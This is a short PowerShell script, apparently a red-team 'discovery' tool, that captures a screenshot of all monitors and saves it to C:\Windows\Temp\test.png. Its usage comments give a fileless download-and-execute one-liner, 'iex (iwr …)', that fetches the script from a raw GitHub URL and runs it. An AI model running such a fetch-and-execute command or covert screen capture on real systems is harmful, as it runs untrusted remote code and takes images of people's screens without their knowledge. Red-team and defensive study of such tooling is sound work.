# Usage:
# iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);
# OR
# powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Easy_4.ps1);"
# Default path: C:\Windows\Temp\test.png


$screens = [Windows.Forms.Screen]::AllScreens
$top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
$left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
$width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
$height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
$bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
$bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
$graphics = [Drawing.Graphics]::FromImage($bmp)
$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
$bmp.Save("$env:C:\Windows\Temp\test.png")
$graphics.Dispose()
$bmp.Dispose()
